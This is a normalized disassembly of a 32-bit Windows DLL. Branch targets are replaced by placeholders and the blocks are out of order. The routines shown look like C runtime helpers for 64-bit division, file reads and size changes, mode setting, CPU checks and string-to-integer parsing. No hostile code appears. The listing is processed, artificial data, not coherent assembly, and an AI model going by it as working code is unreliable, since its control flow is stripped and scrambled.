or ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
shl edx 0xb
test esi ecx
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
jne r-xdata
movzx edi cx
pop edi
pop esi
mov [ eax + 0x8 ] cx
pop ebx
leave
retn
sub_1000dca7
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov [ ebp - 0x30 ] eax
push edi
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_1000dbec
pop ecx
pop ecx
lea eax [ ebp - 0x2c ]
push eax
push 0x0
push 0x11
sub esp 0xc
lea esi [ ebp - 0x10 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_1000ed61
mov esi [ ebp - 0x30 ]
mov [ ebx + 0x8 ] eax
movsx eax [ ebp - 0x2a ]
mov [ ebx ] eax
movsx eax [ ebp - 0x2c ]
mov [ ebx + 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
push [ ebp + 0x18 ]
push esi
call sub_10009649
add esp 0x24
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
mov [ ebx + 0xc ] esi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_100026a8
leave
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_10004870
add esp 0x14
sub_1000dd40
push edi
push esi
push ebp
xor edi edi
xor ebp ebp
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
inc ebp
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x18 ]
mov ecx eax
mov eax esi
mul [ esp + 0x18 ]
add edx ecx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
dec ebp
jns r-xdata
dec esi
sub eax [ esp + 0x18 ]
sbb edx [ esp + 0x1c ]
cmp edx [ esp + 0x14 ]
ja r-xdata
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
dec edi
jne r-xdata
neg edx
neg eax
sbb edx 0x0
jb r-xdata
pop ebp
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
xor ebx ebx
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_1000de20
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov eax edx
xor edx edx
and cl 0x1f
shr eax cl
retn
shrd eax edx cl
shr edx cl
retn
sub_1000de48
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
and eax 0xfff7ffff
and ecx eax
test ecx 0xfcf0fce0
push esi
je r-xdata
mov esi [ ebp + 0x8 ]
test esi esi
push eax
push [ ebp + 0xc ]
je r-xdata
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
cmp edi esi
je r-xdata
call sub_1000f757
call sub_1000f757
mov [ esi ] eax
jmp r-xdata
call sub_100049cb
push 0x16
pop edi
push esi
push esi
push esi
push esi
push esi
mov [ eax ] edi
call sub_1000496c
add esp 0x14
mov eax edi
pop edi
jmp r-xdata
push esi
push esi
call sub_1000f757
pop ecx
pop ecx
mov [ edi ] eax
pop ecx
pop ecx
xor eax eax
pop esi
pop ebp
retn
sub_1000dec0
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_1000df60
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_1000df94
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
xor ebx ebx
push 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
call sub_1000c208
mov [ ebp - 0x18 ] eax
and eax edx
add esp 0x10
cmp eax 0xffffffff
mov [ ebp - 0x14 ] edx
je r-xdata
call sub_100049cb
mov eax [ eax ]
push 0x2
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_1000c208
mov ecx eax
and ecx edx
add esp 0x10
cmp ecx 0xffffffff
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
sub esi eax
sbb edi edx
js r-xdata
cmp edi ebx
jg r-xdata
jg r-xdata
push ebx
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push [ ebp + 0x8 ]
call sub_1000c208
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
jl r-xdata
mov ebx 0x1000
push ebx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
mov [ ebp - 0x4 ] eax
jne r-xdata
cmp esi ebx
jbe r-xdata
xor eax eax
jmp r-xdata
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000c208
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
cmp esi ebx
jae r-xdata
push 0x8000
push [ ebp + 0x8 ]
call sub_1000e6ea
pop ecx
pop ecx
mov [ ebp - 0x8 ] eax
call sub_100049cb
mov [ eax ] 0xc
pop edi
pop esi
pop ebx
leave
retn
push [ ebp + 0x8 ]
call sub_1000be55
pop ecx
push eax
call [ SetEndOfFile@IAT ]
neg eax
sbb eax eax
neg eax
dec eax
cdq
mov [ ebp - 0x10 ] eax
and eax edx
cmp eax 0xffffffff
mov [ ebp - 0xc ] edx
jne r-xdata
mov eax esi
jg r-xdata
call sub_100049cb
mov [ eax ] 0xd
call sub_100049de
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
mov esi [ ebp - 0x10 ]
call sub_100049de
cmp [ eax ] 0x5
jne r-xdata
cdq
sub esi eax
sbb edi edx
js r-xdata
mov eax ebx
jmp r-xdata
cmp esi ebx
jb r-xdata
or esi 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
call sub_100049cb
mov [ eax ] 0xd
mov esi [ ebp - 0x10 ]
jg r-xdata
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_10006724
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_1000e6ea
pop ecx
pop ecx
push [ ebp - 0x4 ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor ebx ebx
jmp r-xdata
and esi [ ebp - 0xc ]
cmp esi 0xffffffff
je r-xdata
test edi edi
jl r-xdata
test esi esi
ja r-xdata
sub_1000e148
push ebp
mov ebp esp
sub esp 0x1c
mov edx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push 0xfffffffe
pop eax
cmp esi eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x1c ] edx
jne r-xdata
push edi
xor edi edi
cmp esi edi
jl r-xdata
call sub_100049de
and [ eax ] 0x0
call sub_100049cb
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_100049de
mov [ eax ] edi
call sub_100049cb
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x9
call sub_1000496c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp esi [ rw-data ]
jb r-xdata
pop esi
leave
retn
pop edi
mov eax esi
and esi 0x1f
imul esi esi 0x28
sar eax 0x5
push ebx
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebx ]
add eax esi
mov cl [ eax + 0x4 ]
test cl 0x1
jne r-xdata
cmp edx edi
mov [ ebp - 0x10 ] edi
je r-xdata
call sub_100049de
mov [ eax ] edi
call sub_100049cb
mov [ eax ] 0x9
jmp r-xdata
xor eax eax
test cl 0x2
jne r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_1000496c
add esp 0x14
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx edi
je r-xdata
or eax 0xffffffff
jmp r-xdata
call sub_100049de
mov [ eax ] edi
call sub_100049cb
mov [ eax ] 0x16
mov al [ eax + 0x24 ]
add al al
sar al 0x1
mov [ ebp - 0x2 ] al
movsx eax al
dec eax
je r-xdata
pop ebx
mov eax edx
not eax
test al 0x1
jne r-xdata
dec eax
jne r-xdata
mov eax edx
push 0x4
pop ecx
shr eax 0x1
cmp eax ecx
mov [ ebp + 0x10 ] ecx
jb r-xdata
mov [ ebp - 0xc ] ecx
mov eax edx
not eax
test al 0x1
je r-xdata
push [ ebp + 0x10 ]
call sub_10008468
cmp eax edi
pop ecx
mov [ ebp - 0xc ] eax
jne r-xdata
mov [ ebp + 0x10 ] eax
push 0x0
lea ecx [ ebp - 0x18 ]
push ecx
push [ ebp + 0x10 ]
push eax
mov eax [ ebx ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov cl [ edi + 0x5 ]
cmp cl 0xa
je r-xdata
and edx 0xfffffffe
mov [ ebp + 0x10 ] edx
mov ecx [ ebx ]
mov eax [ ebp - 0xc ]
lea edi [ esi + ecx ]
test [ edi + 0x4 ] 0x48
je r-xdata
call sub_100049cb
mov [ eax ] 0xc
call sub_100049de
mov [ eax ] 0x8
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
mov edi [ ebp - 0x18 ]
test edi edi
jl r-xdata
xor edx edx
cmp [ ebp + 0x10 ] edx
je r-xdata
cmp eax 0x6d
jne r-xdata
call sub_100049cb
mov [ eax ] 0x9
call sub_100049de
mov [ eax ] esi
jmp r-xdata
cmp edi [ ebp + 0x10 ]
ja r-xdata
mov [ eax ] cl
mov ecx [ ebx ]
inc eax
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] dl
mov [ ebp - 0x10 ] 0x1
mov [ esi + ecx + 0x5 ] 0xa
je r-xdata
push eax
call sub_100049f1
pop ecx
and [ ebp - 0x14 ] 0x0
jmp r-xdata
or [ ebp - 0x14 ] 0xffffffff
mov eax [ ebx ]
add [ ebp - 0x10 ] edi
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x80
je r-xdata
mov ecx [ ebx ]
mov cl [ esi + ecx + 0x25 ]
cmp cl 0xa
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax 0xfffffffe
jne r-xdata
push eax
call sub_100063a9
pop ecx
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0xc ]
je r-xdata
cmp [ ebp - 0x2 ] 0x2
je r-xdata
cmp [ ebp + 0x10 ] edx
je r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
test edi edi
je r-xdata
test edi edi
je r-xdata
mov [ eax ] cl
mov ecx [ ebx ]
inc eax
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0x10 ] 0x2
mov [ esi + ecx + 0x25 ] 0xa
jne r-xdata
and [ eax ] 0xfb
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0xa
jne r-xdata
and [ eax ] 0xfb
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0xa
jne r-xdata
mov ecx [ ebx ]
mov cl [ esi + ecx + 0x26 ]
cmp cl 0xa
je r-xdata
sub edi [ ebp - 0xc ]
mov [ ebp - 0x10 ] edi
jmp r-xdata
mov eax [ ebp + 0x10 ]
movzx ecx [ eax ]
cmp cx 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
mov eax edi
sub eax [ ebp - 0xc ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0x10 ] eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ecx ]
cmp al 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
cmp [ ebp + 0x10 ] edx
je r-xdata
mov ecx [ ebx ]
lea esi [ esi + ecx + 0x4 ]
test [ esi ] 0x40
jne r-xdata
cmp cx 0xd
je r-xdata
mov edi [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
add eax edi
cmp edi eax
mov [ ebp + 0x10 ] edi
mov [ ebp - 0x10 ] eax
jae r-xdata
test eax eax
je r-xdata
mov eax [ ebx ]
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov edi [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
add eax edi
cmp edi eax
mov [ ebp + 0x10 ] edi
mov [ ebp - 0x10 ] eax
jae r-xdata
mov [ eax ] cl
mov ecx [ ebx ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x3
mov [ esi + ecx + 0x26 ] 0xa
mov ax [ eax ]
mov [ edi ] ax
inc edi
inc edi
or [ esi ] 0x2
jmp r-xdata
mov ecx [ ebp - 0x10 ]
add ecx 0xfffffffe
cmp eax ecx
jae r-xdata
mov [ edi ] cx
inc edi
inc edi
inc eax
inc eax
mov [ ebp + 0x10 ] eax
jmp r-xdata
dec edi
mov cl [ edi ]
test cl cl
js r-xdata
mov al [ ecx ]
mov [ edi ] al
inc edi
or [ eax ] 0x2
jmp r-xdata
mov eax [ ebp - 0x10 ]
dec eax
cmp ecx eax
jae r-xdata
mov [ edi ] al
inc edi
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add [ ebp + 0x10 ] 0x2
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x2
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebx ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea ecx [ eax + 0x2 ]
cmp [ ecx ] 0xa
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
xor eax eax
inc eax
movzx ecx cl
jmp r-xdata
inc edi
jmp r-xdata
inc [ ebp + 0x10 ]
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
mov eax [ ebx ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea eax [ ecx + 0x1 ]
cmp [ eax ] 0xa
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add eax 0x4
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ecx + rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
sub edi [ ebp - 0xc ]
shr eax 0x1
push eax
push [ ebp + 0xc ]
push edi
push [ ebp - 0xc ]
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
test eax eax
mov [ ebp - 0x10 ] eax
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] eax
jmp r-xdata
inc ecx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
mov [ edi ] 0xd
mov eax [ ebx ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
inc edi
inc edi
cmp eax 0x4
jg r-xdata
mov dl [ edi ]
movzx ecx dl
movsx ecx [ ecx + rw-data ]
test ecx ecx
jne r-xdata
add eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ edi ] 0xd
mov eax [ ebx ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
inc edi
cmp edi [ ebp - 0xc ]
jne r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp edi [ ebp - 0xc ]
jb r-xdata
inc ecx
cmp ecx eax
jne r-xdata
call sub_100049cb
mov [ eax ] 0x2a
jmp r-xdata
cmp edi [ ebp - 0xc ]
jne r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
push 0x1
push 0xffffffff
push 0xfffffffe
push [ ebp + 0x8 ]
call sub_1000c208
add esp 0x10
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
mov [ edi ] 0xa
jmp r-xdata
mov [ edi ] 0xd
mov eax [ ebx ]
mov cl [ ebp - 0x8 ]
mov [ esi + eax + 0x5 ] cl
mov eax [ ebx ]
mov cl [ ebp - 0x7 ]
mov [ esi + eax + 0x25 ] cl
mov eax [ ebx ]
mov [ esi + eax + 0x26 ] 0xa
jmp r-xdata
dec edi
movzx ecx [ edi ]
inc eax
mov ecx [ ebx ]
add ecx esi
test [ ecx + 0x4 ] 0x48
je r-xdata
add edi eax
jmp r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push [ ebp + 0x8 ]
call sub_1000c208
add esp 0x10
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
mov [ edi ] 0xa
jmp r-xdata
mov [ edi ] 0xd
mov eax [ ebx ]
mov cl [ ebp - 0x1 ]
mov [ esi + eax + 0x5 ] cl
jmp r-xdata
neg eax
cdq
push 0x1
push edx
push eax
push [ ebp + 0x8 ]
call sub_1000c208
add esp 0x10
inc edi
cmp eax 0x2
mov [ ecx + 0x5 ] dl
jl r-xdata
cmp eax 0x3
jne r-xdata
mov dl [ edi ]
mov ecx [ ebx ]
mov [ esi + ecx + 0x25 ] dl
inc edi
sub edi eax
jmp r-xdata
mov dl [ edi ]
mov ecx [ ebx ]
mov [ esi + ecx + 0x26 ] dl
inc edi
sub_1000e6ea
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax edx
sar eax 0x5
and edx 0x1f
imul edx edx 0x28
push ebx
mov ebx [ ebp + 0xc ]
push esi
lea esi [ eax * 4 + rw-data ]
mov eax [ esi ]
lea ecx [ eax + edx ]
movzx eax [ ecx + 0x4 ]
and eax 0x80
mov [ ebp + 0x8 ] eax
mov al [ ecx + 0x24 ]
add al al
movsx eax al
push edi
mov edi 0x4000
sar eax 0x1
cmp ebx edi
je r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ esi ]
lea ecx [ ecx + edx + 0x24 ]
and [ ecx ] 0x80
cmp ebx 0x8000
je r-xdata
neg eax
sbb eax eax
and eax 0xc000
add eax edi
mov eax 0x8000
jmp r-xdata
and [ ecx + 0x4 ] 0x7f
jmp r-xdata
cmp ebx 0x10000
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ esi ]
lea ecx [ ecx + edx + 0x24 ]
mov dl [ ecx ]
and dl 0x82
or dl 0x2
jmp r-xdata
cmp ebx 0x20000
je r-xdata
mov [ ecx ] dl
jmp r-xdata
cmp ebx 0x40000
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ esi ]
lea ecx [ ecx + edx + 0x24 ]
mov dl [ ecx ]
and dl 0x81
or dl 0x1
sub_1000e7a6
mov eax [ esp + 0x4 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
pop esi
retn
call sub_100049cb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1000496c
add esp 0x14
push 0x16
pop eax
pop esi
retn
sub_1000e7f9
mov eax [ rw-data ]
cmp eax 0xffffffff
push esi
mov esi [ CloseHandle@IAT ]
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp eax 0xfffffffe
je r-xdata
pop esi
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call esi
push eax
call esi
sub_1000e876
push ebp
mov ebp esp
sub esp 0x18
xor eax eax
push ebx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
push ebx
pushfd
pop eax
mov ecx eax
xor eax 0x200000
push eax
popfd
pushfd
pop edx
sub edx ecx
je r-xdata
pop ebx
test [ ebp - 0x4 ] 0x4000000
je r-xdata
push ecx
popfd
xor eax eax
cpuid
mov [ ebp - 0xc ] eax
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] ecx
mov eax 0x1
cpuid
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
call sub_1000e826
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebx
leave
retn
sub_1000e8e3
push 0x10
push r--data
call sub_10005acc
xor eax eax
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp ebx edi
setne al
cmp eax edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_100049cb
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_1000496c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
push [ rw-data ]
call [ HeapSize@IAT ]
mov esi eax
push 0x4
call sub_100072ab
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_10007324
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
call sub_10005b11
retn
mov esi [ ebp - 0x1c ]
mov esi [ ebx - 0x4 ]
sub esi 0x9
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov eax esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000e97d
cmp [ ebp - 0x20 ] edi
jne r-xdata
sub_1000e986
push ebp
lea ebp [ esp - 0x2a8 ]
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x2a4 ] eax
test [ rw-data ] 0x1
push esi
je r-xdata
call sub_1000ccd6
test eax eax
je r-xdata
push 0xa
call sub_100081ec
pop ecx
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_1000cce3
pop ecx
push 0x3
call sub_10008180
int3
mov [ ebp + 0x88 ] eax
mov [ ebp + 0x84 ] ecx
mov [ ebp + 0x80 ] edx
mov [ ebp + 0x7c ] ebx
mov [ ebp + 0x78 ] esi
mov [ ebp + 0x74 ] edi
mov [ ebp + 0xa0 ] ss
mov [ ebp + 0x94 ] cs
mov [ ebp + 0x70 ] ds
mov [ ebp + 0x6c ] es
mov [ ebp + 0x68 ] fs
mov [ ebp + 0x64 ] gs
pushfd
pop [ ebp + 0x98 ]
mov esi [ ebp + 0x2ac ]
lea eax [ ebp + 0x2ac ]
mov [ ebp + 0x9c ] eax
mov [ ebp - 0x28 ] 0x10001
mov [ ebp + 0x90 ] esi
mov eax [ eax - 0x4 ]
push 0x50
mov [ ebp + 0x8c ] eax
lea eax [ ebp - 0x80 ]
push 0x0
push eax
call sub_10008c10
lea eax [ ebp - 0x80 ]
add esp 0xc
mov [ ebp - 0x30 ] eax
lea eax [ ebp - 0x28 ]
push 0x0
mov [ ebp - 0x80 ] 0x40000015
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x2c ] eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x30 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
sub_1000ea80
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_1000eaab
push ebp
mov ebp esp
sub esp 0x14
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x14 ]
call sub_100027e4
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
xor edi edi
cmp eax edi
je r-xdata
cmp esi edi
jne r-xdata
mov [ eax ] esi
cmp [ ebp + 0x14 ] edi
je r-xdata
call sub_100049cb
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_1000496c
add esp 0x14
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x14 ]
push ebx
mov bl [ esi ]
mov [ ebp - 0x4 ] edi
lea edi [ esi + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
mov edx [ ecx + 0xc8 ]
movzx eax bl
movzx eax [ edx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x14 ]
push eax
movzx eax bl
push 0x8
push eax
call sub_10004b4b
mov ecx [ ebp - 0x14 ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop edi
pop esi
leave
retn
cmp bl 0x2d
jne r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ ecx + 0xac ] 0x1
jle r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
jl r-xdata
mov bl [ edi ]
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ eax ] esi
cmp eax 0x24
jg r-xdata
xor eax eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
test eax eax
jne r-xdata
cmp eax 0x10
jne r-xdata
cmp bl 0x30
je r-xdata
mov esi [ ecx + 0xc8 ]
or eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
cmp bl 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
test cx 0x103
je r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0x10
jmp r-xdata
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
test al 0x8
jne r-xdata
mov cl bl
sub cl 0x61
cmp cl 0x19
movsx ecx bl
ja r-xdata
cmp ecx [ ebp + 0x14 ]
jae r-xdata
inc edi
mov bl [ edi ]
inc edi
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
test al 0x4
mov esi 0x7fffffff
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or [ ebp + 0x18 ] 0x8
cmp [ ebp - 0x4 ] eax
jb r-xdata
call sub_100049cb
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0xc ]
mov ebx [ ebp - 0x4 ]
imul ebx [ ebp + 0x14 ]
add ebx ecx
mov [ ebp - 0x4 ] ebx
jne r-xdata
mov al [ ebp + 0x18 ]
and al 0x2
neg al
sbb eax eax
neg eax
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx ecx bl
movzx ecx [ esi + ecx * 2 ]
test cl 0x4
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx edx
jbe r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
